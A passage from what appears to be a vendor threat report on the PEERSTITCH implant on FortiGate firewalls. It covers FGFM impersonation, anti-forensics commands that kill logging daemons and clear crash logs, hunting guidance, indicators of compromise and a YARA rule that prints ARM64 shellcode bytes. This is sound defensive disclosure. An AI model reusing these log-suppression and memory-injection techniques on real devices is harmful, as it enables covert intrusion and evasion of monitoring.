+<p>Following FGFM interactions from external infrastructure over TCP port 541, an administrative account named <span>FortiGateCloud</span> downloaded complete running configurations from multiple managed firewalls. The victim organization operated no FortiManager Cloud tenant, and no such account was provisioned on the affected devices.</p>
+<p>We assess with a medium degree of confidence that the attackers issued these commands by impersonating the management platform over FGFM. Two paths were available to them, and the evidence does not distinguish between them:</p>
+<ul>
+<li>Exploitation of <a href="https://www.fortiguard.com/psirt/FG-IR-24-042" target="_blank" rel="noopener">CVE-2024-26009</a> to bypass FGFM authentication using the FortiManager's serial number</li>
+<li>Direct reuse of the exfiltrated trust material to authenticate as the legitimate FortiManager</li>
+</ul>
+<p>Asserting a management identity requires terminating the authentic FortiManager's session. It is possible that the attackers forced this session termination using <a href="https://www.fortiguard.com/psirt/FG-IR-24-041" target="_blank" rel="noopener">CVE-2024-26008</a>, consistent with the intermittent tunnel management interface drops described in the Anti-Forensics and Defense Evasion section below.</p>
+<p>We are aware of other vulnerabilities in which the FortiGateCloud account has been misused to perform unauthorized actions, including:</p>
+<ul>
+<li><a href="https://www.fortiguard.com/psirt/FG-IR-25-647" target="_blank" rel="noopener">CVE-2025-59718</a></li>
+<li><a href="https://www.fortiguard.com/psirt/FG-IR-25-647" target="_blank" rel="noopener">CVE-2025-59719</a></li>
+<li>The related single sign-on (SSO) issues tracked under <a href="https://www.fortiguard.com/psirt/FG-IR-26-060" target="_blank" rel="noopener">FG-IR-26-060</a></li>
+</ul>
+<p>Each of these vulnerabilities requires the device to be enrolled in FortiGate Cloud/FortiCloud SSO, and the affected firewalls held no such enrollment. We exclude these vulnerabilities from scope for this intrusion. We note that the observed activity reused only the account name and none of the exploitation artifacts associated with those issues.</p>
+<h2><a id="post-188095-_ewgci8ooasoq"></a>Anti-Forensics and Defense Evasion</h2>
+<p>The attackers took extensive measures to eliminate forensic artifacts:</p>
+<ul>
+<li><strong>Service termination:</strong> Executed <span>killall -9 miglogd</span> and <span>killall -9 syslogd</span> to halt local and remote syslog generation prior to executing malicious auto-scripts</li>
+<li><strong>Crash log clearing:</strong> Issued FortiOS diagnostic command <span>diagnose debug</span> <span>crashlog clear</span> to wipe segmentation fault logs generated during initial memory injection attempts</li>
+<li><strong>Configuration rollback:</strong> Automatically deleted rogue administrator accounts, rogue VPN groups and auto-script objects (<span>../../../../setup</span>) shortly after execution</li>
+<li><strong>Decoy artifact creation:</strong> Overwrote <span>/tmp/apache2/conf/md-acme.conf</span> with a common string found in this file (<span>#0 certs managed by ACME\n\n\n</span>) to mask reverse-shell configuration files</li>
+<li><strong>Process memory self-deletion:</strong> <span>lldprx</span> unlinked its own binary from disk and scanned <span>/proc/</span> to terminate the staging <span>setup</span> process before exiting</li>
+<li><strong>Logging telemetry disruption: </strong>Log telemetry showed intermittent drops across the tunnel management interface during periods of malicious activity. We assess with medium confidence that the attackers deliberately induced this degradation to suppress real-time telemetry to central management consoles. This is consistent with the previously described pattern of telemetry suppression, including terminating <span>miglogd</span> and <span>syslogd</span>, clearing crash logs, and rolling back configuration objects. It’s possible that the attackers forced the disconnects using <a href="https://www.fortiguard.com/psirt/FG-IR-24-041" target="_blank" rel="noopener">CVE-2024-26008</a> over TCP port 541. Available logs do not capture the triggered traffic, so we could not confirm the mechanism.</li>
+</ul>
+<h2><a id="post-188095-_8vvmhe1fr17h"></a>Detection Opportunities and Forensic Guidance</h2>
+<p>Because PEERSTITCH runs entirely in memory without creating persistent files or listening ports, detection requires specialized hunting techniques that Table 2 below documents.</p>
+<table>
+<tbody>
+<tr>
+<td><strong>Detection Surface</strong></td>
+<td><strong>Artifact/Indicator</strong></td>
+<td><strong>Technical Hunting Guidance</strong></td>
+</tr>
+<tr>
+<td>Volatile memory</td>
+<td>16 KB RWX <span>mmap</span> region</td>
+<td>Inspect memory maps (<span>/proc/&lt;pid&gt;/maps</span>) of <span>/bin/miglogd</span> and <span>/bin/iked</span> for anonymous 16,384-byte regions with <span>rwxp</span> permissions</td>
+</tr>
+<tr>
+<td>Daemon integrity</td>
+<td>NOP text patches</td>
+<td>Verify text segment integrity at <span>base+0x106F7B8</span>, <span>base+0x1072E20</span> and <span>base+0x109A570</span> for <span>0xAA0003E0</span> (<span>MOV X0, X0</span>)</td>
+</tr>
+<tr>
+<td>System calls</td>
+<td>Cross-PID <span>/proc/mem</span> access</td>
+<td>Audit kernel syscall telemetry for <span>open()</span> and <span>write()</span> operations targeting <span>/proc/&lt;pid&gt;/mem</span> between <span>miglogd</span> and <span>iked</span></td>
+</tr>
+<tr>
+<td>Diagnostic logs</td>
+<td>Crashlog segmentation faults</td>
+<td>Query <span>diagnose debug crashlog read</span> for Signal 11 (Segmentation Fault) crashes involving <span>miglogd</span>, <span>iked</span> or <span>syslogd</span></td>
+</tr>
+<tr>
+<td>Configuration audit</td>
+<td>Auto-script traversal objects</td>
+<td>Inspect FortiOS configuration revisions for <span>system.auto-script</span> objects containing path traversal strings (<span>../../</span>)</td>
+</tr>
+</tbody>
+</table>
+<p><span>Table 2. PEERSTITCH's specialized hunting techniques.</span></p>
+<h2><a id="post-188095-_pu498t8mlb1l"></a>Conclusion</h2>
+<p>This intrusion highlights a growing threat, the weaponization of centralized edge management ecosystems to compromise downstream networks. One compromised appliance yielded the cryptographic keys, credentials and network topology for more than 500 firewalls, including devices protecting client organizations.</p>
+<p>The discovery of the PEERSTITCH implant demonstrates the increasing technical maturity of edge-device malware. By operating as a one-shot injector, avoiding persistent disk artifacts and building a covert inter-process communication bridge inside process memory, the attackers achieved sustained persistence while evading traditional monitoring.</p>
+<p>For organizations that manage infrastructure on behalf of others, the management platform is the highest-value target on the network. Compromising the management platform is not contained by the boundary of the organization that owns it. That compromise also does not end when the platform is patched.</p>
+<p>The cryptographic trust material governing the platform's relationship with every managed device leaves with the attacker and remains valid until it is rotated. Defenders must treat edge management interfaces with the highest level of zero trust isolation. They must also treat the credentials and certificates those interfaces hold as compromised the moment the platform is.</p>
+<p>Palo Alto Networks customers are better protected from the threats discussed above through the following products and services:</p>
+<ul>
+<li>The <a href="https://docs.paloaltonetworks.com/wildfire" target="_blank" rel="noopener">Advanced WildFire</a> machine-learning models and analysis techniques have been reviewed and updated in light of the indicators shared in this research.</li>
+<li><a href="https://docs.paloaltonetworks.com/advanced-url-filtering" target="_blank" rel="noopener">Advanced URL Filtering</a>, <a href="https://docs.paloaltonetworks.com/dns-security" target="_blank" rel="noopener">Advanced DNS Security</a> and <a href="https://www.paloaltonetworks.com/network-security/advanced-ip-defense" target="_blank" rel="noopener">Advanced IP Defense</a> are designed to identify known domains and URLs associated with this activity as malicious.</li>
+<li><a href="https://docs.paloaltonetworks.com/ngfw" target="_blank" rel="noopener">Next-Generation Firewall</a> with the <a href="https://docs.paloaltonetworks.com/advanced-threat-prevention/administration" target="_blank" rel="noopener">Advanced Threat Prevention</a> security subscription can help block CVE-2024-47575 with best practices via the following Threat Prevention signatures <a href="https://threatvault.paloaltonetworks.com/?query=95788" target="_blank" rel="noopener">95788</a>, <a href="https://threatvault.paloaltonetworks.com/?query=96788" target="_blank" rel="noopener">96788</a>.</li>
+<li><a href="https://docs-cortex.paloaltonetworks.com/p/XPANSE" target="_blank" rel="noopener">Cortex Xpanse</a> is designed to identify exposed devices and applications on the public internet and escalate these findings to defenders.</li>
+<li><a href="https://docs.paloaltonetworks.com/iot/getting-started/iot-security-solution" target="_blank" rel="noopener">Device Security</a> is designed to proactively protect the specialized device attack surface of operational environments, providing deep visibility into industrial protocols, actionable risk insights, and adaptive security enforcement across all OT and IoT assets.</li>
+</ul>
+<p>If you think you may have been compromised or have an urgent matter, get in touch with the <a href="https://www.paloaltonetworks.com/unit42/contact-unit42" target="_blank" rel="noopener"><span>Unit 42 Incident Response team</span></a> or call:</p>
+<ul>
+<li>North America Toll Free: +1 (866) 486-4842 (866.4.UNIT42)</li>
+<li>UK: +44.20.3743.3660</li>
+<li>Europe and Middle East: +31.20.299.3130</li>
+<li>Asia: +65.6983.8730</li>
+<li>Japan: +81.50.1790.0200</li>
+<li>Australia: +61.2.4062.7950</li>
+<li>India: 000 800 050 45107</li>
+<li>South Korea: +82.080.467.8774</li>
+</ul>
+<p>Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. <a href="https://www.cyberthreatalliance.org/" target="_blank" rel="noopener">Learn more about the Cyber Threat Alliance.</a></p>
+<h2><a id="post-188095-_m0pyzkn5ft5a"></a>Indicators of Compromise</h2>
+<p>Table 3 lists the filenames and SHA-256 hashes associated with PEERSTITCH activity.</p>
+<table>
+<tbody>
+<tr>
+<td><strong>Type</strong></td>
+<td><strong>Value</strong></td>
+<td><strong>Context</strong></td>
+</tr>
+<tr>
+<td>SHA-256 hash</td>
+<td><span>b9fb0b27ddd59b58d3ae53c7227298a3e0de1e6f868b9429ae21533bb9cd1e70</span></td>
+<td>ELF 64-bit ARM64 executable; PEERSTITCH core ptrace injector</td>
+</tr>
+<tr>
+<td>SHA-256 hash</td>
+<td><span>829b1cd270b30565739a478441833f49f10a49bd06f0d18cc96c8ae4a0431f11</span></td>
+<td>PEERSTITCH ARM64 mmap shellcode bootstrap header (45 bytes)</td>
+</tr>
+<tr>
+<td>SHA-256 hash</td>
+<td><span>bd064244dad748cf2a44074bee56f5bfab4a2b18ee944b75d1b3febd4c1fe02a</span></td>
+<td>PEERSTITCH ARM64 core hook injection data block (1,280 bytes)</td>
+</tr>
+<tr>
+<td>SHA-256 hash</td>
+<td><span>9c4c4436ff5cdf0d6d68f5108031cbf3708a095cde4ef8c09316af7a7110437e</span></td>
+<td>PEERSTITCH staging and preparation script</td>
+</tr>
+<tr>
+<td>SHA-256 hash</td>
+<td><span>fc1b10c58057ef9f1f9a1e2a3d4a1c89f43b0ead451398c70ed7a6e0312b36ee</span></td>
+<td>PEERSTITCH Node.js deployment orchestrator</td>
+</tr>
+<tr>
+<td>SHA-256 hash</td>
+<td><span>f84eea718526706afdf2d1a2774fab76ecb11c18fb61995a37be8249c5e379ab</span></td>
+<td>PEERSTITCH emscripten JavaScript runtime component</td>
+</tr>
+<tr>
+<td>SHA-256 hash</td>
+<td><span>b7ae166fd49a7ecfe6322a80b8aa56d6aa0825d8f5d106dab2e4fb7d14ce15a8</span></td>
+<td>PEERSTITCH emscripten WebAssembly binary module</td>
+</tr>
+<tr>
+<td>SHA-256 hash</td>
+<td><span>8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92</span></td>
+<td>PEERSTITCH runtime shared secret key artifact (hard-coded string “123456”)</td>
+</tr>
+<tr>
+<td>Filename</td>
+<td><span>lldprx</span></td>
+<td>PEERSTITCH malware</td>
+</tr>
+<tr>
+<td>Filename</td>
+<td><span>pM.js</span></td>
+<td>PEERSTITCH malware installer script</td>
+</tr>
+<tr>
+<td>Filename</td>
+<td><span>index.js</span></td>
+<td>PEERSTITCH emscripten JS component</td>
+</tr>
+<tr>
+<td>Filename</td>
+<td><span>index.wasm</span></td>
+<td>PEERSTITCH emscripten WASM module</td>
+</tr>
+<tr>
+<td>Filename</td>
+<td><span>ipssem.js</span></td>
+<td>PEERSTITCH orchestrator script</td>
+</tr>
+<tr>
+<td>Filename and path</td>
+<td><span>../../../../setup</span></td>
+<td>Path-traversal auto-script name</td>
+</tr>
+<tr>
+<td>Filename and path</td>
+<td><span>../../tmp/apache2/conf/md-acme.conf</span></td>
+<td>Path-traversal auto-script name</td>
+</tr>
+</tbody>
+</table>
+<p><span>Table 3. Files and SHA-256 hashes for PEERSTITCH activity. </span></p>
+<p>Table 4 lists the network indicators associated with PEERSTITCH activity.</p>
+<table>
+<tbody>
+<tr>
+<td><strong>Type</strong></td>
+<td><strong>Value</strong></td>
+<td><strong>Context</strong></td>
+</tr>
+<tr>
+<td>IP address</td>
+<td><span>23.240.77[.]233</span></td>
+<td>Hosting installer and PEERSTITCH malware</td>
+</tr>
+<tr>
+<td>IP address</td>
+<td><span>47.18.167[.]159</span></td>
+<td>Hosting installer and PEERSTITCH malware</td>
+</tr>
+<tr>
+<td>IP address</td>
+<td><span>45.32.41[.]202</span></td>
+<td>Rogue FortiGate IP added to FortiManager</td>
+</tr>
+<tr>
+<td>IP address</td>
+<td><span>198.199.122[.]22</span></td>
+<td>Rogue FortiGate IP added to FortiManager</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><span>hxxp[:]//23.240.77[.]233:8085/pM.js</span></td>
+<td>Hosting PEERSTITCH stager</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><span>hxxp[:]//47.18.167[.]159:8085/pM.js</span></td>
+<td>Hosting PEERSTITCH stager</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><span>hxxp[:]//23.240.77[.]233:8084/directory</span></td>
+<td>ACME certificate authority abuse</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><span>hxxp[:]//23.240.77[.]233:8084/acme/new-acct</span></td>
+<td>ACME certificate authority abuse</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><span>hxxp[:]//23.240.77[.]233:8084/acme/order/11111</span></td>
+<td>ACME certificate authority abuse</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><span>hxxp[:]//23.240.77[.]233:8084/acme/authz/1</span></td>
+<td>ACME certificate authority abuse</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><span>hxxp[:]//23.240.77[.]233:8084/acme/finalize/61924744/774083503</span></td>
+<td>ACME certificate authority abuse</td>
+</tr>
+</tbody>
+</table>
+<p><span>Table 4. Network indicators for PEERSTITCH activity. </span></p>
+<p>The following is a YARA rule to discover PEERSTITCH activity:</p>
+
+		<div id="crayon-6af9fda0c6b44370535962" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover wrap">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay"><span class="crayon-title"></span>
+			<div class="crayon-tools"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info"></div>
+			<div class="crayon-plain-wrap"><textarea class="crayon-plain print-no" data-settings="dblclick" readonly>
+rule u42_apt_linux_PEERSTITCH_fortigate_implant
+{
+  meta:
+    author = "Unit 42 - PaloAltoNetworks"
+    description = "Identifies FortiGate process memory patching implant (ptrace injector targeting miglogd/iked)"
+    hash = "b9fb0b27ddd59b58d3ae53c7227298a3e0de1e6f868b9429ae21533bb9cd1e70"
+    malware_family = "PEERSTITCH_fortigate_implant"
+
+  strings:
+    // ARM64 mmap shellcode template (.rodata 0x45A688)
+    // Allocates 16KB RWX via mmap, writes trampoline, jumps to it
+    // Full 45-byte sequence: MOV X0-X5,X8 setup -&gt; SVC #0 -&gt; MOV W1,#0xD4200000 -&gt; STR -&gt; BR X0
+    $shellcode_template = {
+      00 00 80 D2 // MOV X0, #0
+      01 00 88 D2 // MOV X1, #0x4000
+      E2 00 80 D2 // MOV X2, #7 (RWX)
+      43 04 80 D2 // MOV X3, #0x22 (MAP_PRIVATE|MAP_ANONYMOUS)
+      04 00 80 D2 // MOV X4, #0
+      05 00 80 D2 // MOV X5, #0
+      C8 1B 80 D2 // MOV X8, #0xDE (__NR_mmap)
+      01 00 00 D4 // SVC #0
+      01 84 BA 52 // MOV W1, #0xD4200000
+      01 00 00 B9 // STR W1, [X0]
+      00 00 1F D6 // BR  X0
+    }
+    // Injection payload entry prologue (.data 0x494048)
+    // ADR+LDUR dispatch -&gt; stack frame 0x110 -&gt; bulk STP register save
+    $injection_entry = {
+      1E 00 00 10 // ADR X30, #0
+      DE C3 40 F8 // LDUR X30, [X30, #0xC]
+      C0 03 1F D6 // RET
+      00 00 00 00
+      00 00 00 00
+      00 00 00 00
+      FF 43 04 D1 // SUB SP, SP, #0x110
+      E0 0F 00 F9 // STR X0, [SP, #0x18]
+      E1 0B 02 A9 // STP X1, X2, [SP, #0x20]
+      E3 13 03 A9 // STP X3, X4, [SP, #0x30]
+      E5 1B 04 A9 // STP X5, X6, [SP, #0x40]
+      E7 23 05 A9 // STP X7, X8, [SP, #0x50]
+      E9 2B 06 A9 // STP X9, X10, [SP, #0x60]
+      EB 33 07 A9 // STP X11, X12, [SP, #0x70]
+      ED 3B 08 A9 // STP X13, X14, [SP, #0x80]
+      EF 43 09 A9 // STP X15, X16, [SP, #0x90]
+      F1 4B 0A A9 // STP X17, X18, [SP, #0xA0]
+      F3 53 0B A9 // STP X19, X20, [SP, #0xB0]
+      F5 5B 0C A9 // STP X21, X22, [SP, #0xC0]
+      F7 63 0D A9 // STP X23, X24, [SP, #0xD0]
+      F9 6B 0E A9 // STP X25, X26, [SP, #0xE0]
+      FB 73 0F A9 // STP X27, X28, [SP, #0xF0]
+      FD 7B 10 A9 // STP X29, X30, [SP, #0x100]
+    }
+
+    // Operational strings (.rodata 0x45A600-0x45A678)
+    $s_miglogd = "/bin/miglogd"
+    $s_iked = "/bin/iked"
+    $s_match_ip = "169.254.0.1"
+    $s_cover_path = "/tmp/apache2/conf/md-acme.conf"
+    $s_cover_content = "#0 certs managed by ACME"
+    $s_proc_mem = "/proc/%d/mem"
+  condition:
+    uint32(0) == 0x464C457F and (
+      $shellcode_template or
+      $injection_entry or
+      (4 of ($s_*))
+    )
+}</textarea></div>
+			<div class="crayon-main">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content"><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-2">2</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-4">4</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-6">6</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-8">8</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-10">10</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-12">12</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-14">14</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-16">16</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-18">18</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-20">20</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-22">22</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-24">24</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-26">26</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-28">28</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-30">30</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-32">32</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-34">34</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-36">36</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-38">38</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-40">40</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-42">42</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-44">44</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-46">46</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-48">48</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-50">50</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-52">52</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-54">54</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-56">56</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-58">58</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-60">60</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-62">62</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-64">64</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-6af9fda0c6b44370535962-66">66</div><div class="crayon-num" data-line="crayon-6af9fda0c6b44370535962-67">67</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre"><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-1"><span class="crayon-e">rule</span><span class="crayon-h"> </span><span class="crayon-e">u42_apt_linux_PEERSTITCH_fortigate_implant</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-3"><span class="crayon-h">  </span><span class="crayon-i">meta</span><span class="crayon-sy">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-4"><span class="crayon-h">    </span><span class="crayon-i">author</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"Unit 42 - PaloAltoNetworks"</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-5"><span class="crayon-h">    </span><span class="crayon-i">description</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"Identifies FortiGate process memory patching implant (ptrace injector targeting miglogd/iked)"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-6"><span class="crayon-h">    </span><span class="crayon-i">hash</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"b9fb0b27ddd59b58d3ae53c7227298a3e0de1e6f868b9429ae21533bb9cd1e70"</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-7"><span class="crayon-h">    </span><span class="crayon-i">malware_family</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-s">"PEERSTITCH_fortigate_implant"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-8"> </div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-9"><span class="crayon-h">  </span><span class="crayon-i">strings</span><span class="crayon-sy">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-10"><span class="crayon-h">    </span><span class="crayon-c">// ARM64 mmap shellcode template (.rodata 0x45A688)</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-11"><span class="crayon-h">    </span><span class="crayon-c">// Allocates 16KB RWX via mmap, writes trampoline, jumps to it</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-12"><span class="crayon-h">    </span><span class="crayon-c">// Full 45-byte sequence: MOV X0-X5,X8 setup -&gt; SVC #0 -&gt; MOV W1,#0xD4200000 -&gt; STR -&gt; BR X0</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-13"><span class="crayon-h">    </span><span class="crayon-sy">$</span><span class="crayon-i">shellcode_template</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-14"><span class="crayon-h">      </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">80</span><span class="crayon-h"> </span><span class="crayon-i">D2</span><span class="crayon-h"> </span><span class="crayon-c">// MOV X0, #0</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-15"><span class="crayon-h">      </span><span class="crayon-cn">01</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">88</span><span class="crayon-h"> </span><span class="crayon-i">D2</span><span class="crayon-h"> </span><span class="crayon-c">// MOV X1, #0x4000</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-16"><span class="crayon-h">      </span><span class="crayon-i">E2</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">80</span><span class="crayon-h"> </span><span class="crayon-i">D2</span><span class="crayon-h"> </span><span class="crayon-c">// MOV X2, #7 (RWX)</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-17"><span class="crayon-h">      </span><span class="crayon-cn">43</span><span class="crayon-h"> </span><span class="crayon-cn">04</span><span class="crayon-h"> </span><span class="crayon-cn">80</span><span class="crayon-h"> </span><span class="crayon-i">D2</span><span class="crayon-h"> </span><span class="crayon-c">// MOV X3, #0x22 (MAP_PRIVATE|MAP_ANONYMOUS)</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-18"><span class="crayon-h">      </span><span class="crayon-cn">04</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">80</span><span class="crayon-h"> </span><span class="crayon-i">D2</span><span class="crayon-h"> </span><span class="crayon-c">// MOV X4, #0</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-19"><span class="crayon-h">      </span><span class="crayon-cn">05</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">80</span><span class="crayon-h"> </span><span class="crayon-i">D2</span><span class="crayon-h"> </span><span class="crayon-c">// MOV X5, #0</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-20"><span class="crayon-h">      </span><span class="crayon-i">C8</span><span class="crayon-h"> </span><span class="crayon-cn">1B</span><span class="crayon-h"> </span><span class="crayon-cn">80</span><span class="crayon-h"> </span><span class="crayon-i">D2</span><span class="crayon-h"> </span><span class="crayon-c">// MOV X8, #0xDE (__NR_mmap)</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-21"><span class="crayon-h">      </span><span class="crayon-cn">01</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-i">D4</span><span class="crayon-h"> </span><span class="crayon-c">// SVC #0</span></div><div class="crayon-line crayon-striped-line" id="crayon-6af9fda0c6b44370535962-22"><span class="crayon-h">      </span><span class="crayon-cn">01</span><span class="crayon-h"> </span><span class="crayon-cn">84</span><span class="crayon-h"> </span><span class="crayon-i">BA</span><span class="crayon-h"> </span><span class="crayon-cn">52</span><span class="crayon-h"> </span><span class="crayon-c">// MOV W1, #0xD4200000</span></div><div class="crayon-line" id="crayon-6af9fda0c6b44370535962-23"><span class="crayon-h">      </span><span class="crayon-cn">01</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-i">B9</span><span class="crayon-h"> </span><span class="crayon-c">// STR W1, [X0]</span></div><div class="crayon-line 